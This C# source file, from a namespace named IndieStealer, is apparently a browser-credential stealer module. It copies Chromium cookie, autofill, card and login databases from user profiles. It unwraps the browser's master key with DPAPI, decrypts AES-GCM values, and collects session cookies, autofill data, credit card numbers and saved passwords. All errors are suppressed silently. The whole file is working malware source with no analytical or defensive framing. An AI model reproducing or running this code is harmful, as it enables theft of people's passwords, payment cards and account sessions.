using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using IndieStealer.Collect.AesGcm.AES;

namespace IndieStealer.Collect.Browsers.Chromium
{
	class Chromium
	{

		public static void GetCookies()
		{
			try
			{
				foreach (var browserModel in BrowserDataStorage.Browsers)
				{
					if (browserModel.Profiles == null || browserModel.LocalKeyPath == null)
						continue;
					foreach (var profile in browserModel.Profiles)
					{	
						if (File.Exists(profile.Path + "\\Network\\Cookies") || File.Exists(profile.Path + "\\Cookies"))
						{
							try
							{
								BrowserData browserData = new BrowserData();
								List<BrowserDataModels.Cookie> cookies = null;
																string file = profile.Path + "\\Cookies";
								if (!File.Exists(file))
									file = profile.Path + "\\Network\\Cookies";
																								MemoryStream ms = new MemoryStream();
								using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
									fs.CopyTo(ms);
								Sqlite3 sqlHandler = new Sqlite3(ms.ToArray());
								string localkey = File.ReadAllText(browserModel.LocalKeyPath);
								string[] parsedArray = Regex.Split(localkey, "\"");
								for (int j = 0; j < parsedArray.Length; j++)
								{
									if (parsedArray[j] == "encrypted_key")
									{
										localkey = parsedArray[j + 2];
										break;
									}
								}

								Encoding encoding = Encoding.Default;
								byte[] key = ProtectedData.Unprotect(
									((byte[])Convert.FromBase64String(localkey).Skip(5).ToArray()), null,
									DataProtectionScope.CurrentUser);
								sqlHandler.ReadTable("cookies");
								int rowCount = sqlHandler.GetRowCount();
								for (int k = 0; k < rowCount; k++)
								{
									try
									{
										string value = sqlHandler.GetValue(k, "encrypted_value");
										byte[] bytes = encoding.GetBytes(value);
										string part = string.Empty;
										try
										{
											if (value.StartsWith("v1"))
											{
												byte[] array2 = new byte[bytes.Length - 15];
												Array.Copy(bytes, 15, array2, 0, bytes.Length - 15);
												byte[] array3 = new byte[16];
												byte[] array4 = new byte[array2.Length - array3.Length];
												Array.Copy(array2, array2.Length - 16, array3, 0, 16);
												Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
												part = encoding.GetString(AESGCM.GcmDecrypt(array4, key,
													(bytes.Skip(3).ToArray()).Take(12).ToArray(), array3));
											}
											else
											{
												part = encoding.GetString(ProtectedData.Unprotect(bytes, null,
													DataProtectionScope.CurrentUser));
											}
										}
										catch (Exception exception)
										{ }

										string host = sqlHandler.GetValue(k, "host_key").Trim();
										string path = sqlHandler.GetValue(k, "path")?.Trim();
										string secure = sqlHandler.GetValue(k, "is_secure");
										string exp = (Convert.ToInt64(sqlHandler.GetValue(k, "expires_utc").Trim()) / 1000000L - 11644473600L).ToString();
										string name = sqlHandler.GetValue(k, "name").Trim();
										if (host == null && value == null)
											continue;
										if (cookies == null)
											cookies = new List<BrowserDataModels.Cookie>();
										cookies.Add(new BrowserDataModels.Cookie
										{
											Domain = host,
											IsHttp = "FALSE",
											Path = path/*values[2]*/,
											IsSecure = secure.Contains("1").ToString().ToUpper(),
											Expires = exp,
											Name = name,
											Value = part
										});

								

									}
									catch (Exception ex)
									{ }
								}
								if (cookies == null)
									continue;
								if (BrowserDataStorage.BrowserData.ContainsKey(profile))
								{
									if (BrowserDataStorage.BrowserData[profile].Cookies != null)
										BrowserDataStorage.BrowserData[profile].Cookies.AddRange(cookies);
									else
									{
										BrowserDataStorage.BrowserData[profile].Cookies = cookies;
									}

								}
								else
								{
									browserData.Cookies = cookies;
									BrowserDataStorage.BrowserData.Add(profile, browserData);
								}
							}
							catch (Exception e)
							{ }

						}
					
					}
				}
			}
			catch (Exception ex)
			{ }
		}
		public static void GetAutoFills()
        {
			try
			{
				foreach (var browserModel in BrowserDataStorage.Browsers)
				{
					if (browserModel.Profiles == null || browserModel.LocalKeyPath == null)
						continue;
					foreach (var profile in browserModel.Profiles)
					{

						if (File.Exists(profile.Path + "\\Web Data"))
						{
							try
							{
								BrowserData browserData = new BrowserData();
								List<BrowserDataModels.Autofill> autofills = null;
																string file = profile.Path + "\\Web Data";
								MemoryStream ms = new MemoryStream();
								using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read,
											FileShare.ReadWrite))
									fs.CopyTo(ms);
								Sqlite3 sqlHandler = new Sqlite3(ms.ToArray());
								sqlHandler.ReadTable("autofill");
								int rowCount = sqlHandler.GetRowCount();
								for (int k = 0; k < rowCount; k++)
								{
									try
									{
										string value = sqlHandler.GetValue(k, 0);
										string value2 = sqlHandler.GetValue(k, 1);
										if (value == null && value2 == null)
											continue;
										if (autofills == null)
											autofills = new List<BrowserDataModels.Autofill>();
										autofills.Add(new BrowserDataModels.Autofill
										{
											Name = value,
											Value = value2
										});
																																																																																																			}
									catch (Exception ex)
									{
									}
								}

								if (autofills == null)
									continue;
								if (BrowserDataStorage.BrowserData.ContainsKey(profile))
								{
									if (BrowserDataStorage.BrowserData[profile].Autofills != null)
										BrowserDataStorage.BrowserData[profile].Autofills.AddRange(autofills);
									else
										BrowserDataStorage.BrowserData[profile].Autofills = autofills;

								}
								else
								{
									browserData.Autofills = autofills;
									BrowserDataStorage.BrowserData.Add(profile, browserData);
								}
							}
							catch (Exception exception) { }
						}
						
					}
				}
			}
			catch
			{ }
		}
		public static void GetCards()
        {
			try
			{
				foreach (var browserModel in BrowserDataStorage.Browsers)
				{
					if (browserModel.Profiles == null || browserModel.LocalKeyPath == null)
						continue;
					foreach (var profile in browserModel.Profiles)
					{						
						if (File.Exists(profile.Path + "\\Web Data"))
						{
							try
							{
								var browserData = new BrowserData();
								List<BrowserDataModels.Card> cards = null;
																string file = profile.Path + "\\Web Data";
								MemoryStream ms = new MemoryStream();
								using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
									fs.CopyTo(ms);
								Sqlite3 sqlHandler = new Sqlite3(ms.ToArray());
								string localkey = File.ReadAllText(browserModel.LocalKeyPath);
								string[] parsedArray = Regex.Split(localkey, "\"");
								for (int j = 0; j < parsedArray.Length; j++)
								{
									if (parsedArray[j] == "encrypted_key")
									{
										localkey = parsedArray[j + 2];
										break;
									}
								}
								byte[] key = ProtectedData.Unprotect(((byte[])Convert.FromBase64String(localkey).Skip(5).ToArray()), null, DataProtectionScope.CurrentUser);
								Encoding encoding = Encoding.Default;
								sqlHandler.ReadTable("credit_cards");
								int rowCount = sqlHandler.GetRowCount();
								for (int b = 0; b < rowCount; b++)
								{
									try
									{
										string value = sqlHandler.GetValue(b, 4);
										byte[] bytes = encoding.GetBytes(value);
										if (value.StartsWith("v1"))
										{
											byte[] array2 = new byte[bytes.Length - 15];
											Array.Copy(bytes, 15, array2, 0, bytes.Length - 15);
											byte[] array3 = new byte[16];
											byte[] array4 = new byte[array2.Length - array3.Length];
											Array.Copy(array2, array2.Length - 16, array3, 0, 16);
											Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
											value = encoding.GetString(AESGCM.GcmDecrypt(array4, key, (bytes.Skip(3).ToArray()).Take(12).ToArray(), array3));
										}
										else
										{
											value = encoding.GetString(ProtectedData.Unprotect(bytes, null, DataProtectionScope.CurrentUser));
										}
										
										string[] values = new string[4];
										for (int i = 0; i < 3; i++)
											values[i] = sqlHandler.GetValue(b, i + 1);
										values[3] = sqlHandler.GetValue(b, 9);
										if (value == null && values[1] == null && values[2] == null)
											continue;
										if (cards == null)
											cards = new List<BrowserDataModels.Card>();
										cards.Add(new BrowserDataModels.Card
										{
											Number = value,
											Exp = values[1] + "/" + values[2],
											Name = values[0],
											Nickname = values[3]
										});
										
									}
									catch (Exception ex)
									{ }
								}
								if (cards == null)
									continue;
								if (BrowserDataStorage.BrowserData.ContainsKey(profile))
								{
									if (BrowserDataStorage.BrowserData[profile].Cards != null)
										BrowserDataStorage.BrowserData[profile].Cards.AddRange(cards);
									else
										BrowserDataStorage.BrowserData[profile].Cards = cards;
								}
								else
								{
									browserData.Cards = cards;
									BrowserDataStorage.BrowserData.Add(profile, browserData);
								}
							}
							catch (Exception e)
							{ }

						}
						
					}
				}
			}
			catch (Exception ex)
			{ }
		}
		public static void GetPasswords()
        {
			try
			{
				foreach (var browserModel in BrowserDataStorage.Browsers)
				{
					if (browserModel.Profiles == null || browserModel.LocalKeyPath == null)
						continue;
					foreach (var profile in browserModel.Profiles)
					{

						if (File.Exists(profile.Path + "\\Login Data"))
                        {
							try
							{
								var browserData = new BrowserData();
								List<BrowserDataModels.Login> logins = null;
								string file = profile.Path + "\\Login Data";
								MemoryStream ms = new MemoryStream();
								using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
									fs.CopyTo(ms);
								Sqlite3 sqlHandler = new Sqlite3(ms.ToArray());
								string localkey = File.ReadAllText(browserModel.LocalKeyPath);
								string[] parsedArray = Regex.Split(localkey, "\"");
								for (int j = 0; j < parsedArray.Length; j++)
								{
									if (parsedArray[j] == "encrypted_key")
									{
										localkey = parsedArray[j + 2];
										break;
									}
								}
								sqlHandler.ReadTable("logins");
								Encoding encoding = Encoding.Default;
								byte[] key = ProtectedData.Unprotect(((byte[])Convert.FromBase64String(localkey).Skip(5).ToArray()), null, DataProtectionScope.CurrentUser);
								int rowCount = sqlHandler.GetRowCount();
								for (int k = 0; k < rowCount; k++)
								{
									try
									{
										string value = sqlHandler.GetValue(k, 5);
										byte[] bytes = encoding.GetBytes(value);
										string url = sqlHandler.GetValue(k, 1);
										string username = sqlHandler.GetValue(k, 3);
										string password = "";
										try
										{
											if (value.StartsWith("v1"))
											{
												byte[] array2 = new byte[bytes.Length - 15];
												Array.Copy(bytes, 15, array2, 0, bytes.Length - 15);
												byte[] array3 = new byte[16];
												byte[] array4 = new byte[array2.Length - array3.Length];
												Array.Copy(array2, array2.Length - 16, array3, 0, 16);
												Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
												password = encoding.GetString(AESGCM.GcmDecrypt(array4, key, (bytes.Skip(3).ToArray()).Take(12).ToArray(), array3));
											}
											else
											{
												password = encoding.GetString(ProtectedData.Unprotect(bytes, null, DataProtectionScope.CurrentUser));
											}
										}
										catch (Exception ex)
										{ }
										if (url == string.Empty || (username == string.Empty && password == string.Empty))
											continue;
										if (logins == null)
											logins = new List<BrowserDataModels.Login>();
										logins.Add(new BrowserDataModels.Login
										{
											Url = url,
											Username = username,
											Password = password
										});
									}
									catch (Exception ex)
									{ }
								}

								if (logins == null)
									continue;
								if (BrowserDataStorage.BrowserData.ContainsKey(profile))
								{
									if (BrowserDataStorage.BrowserData[profile].Logins != null)
										BrowserDataStorage.BrowserData[profile].Logins.AddRange(logins);
									else
										BrowserDataStorage.BrowserData[profile].Logins = logins;
								}
								else
								{
									browserData.Logins = logins;
									BrowserDataStorage.BrowserData.Add(profile, browserData);
								}
							}
							catch (Exception exception)
							{ }
						}

					}
				}
			}
			catch (Exception ex)
			{ }
		}

	}

}
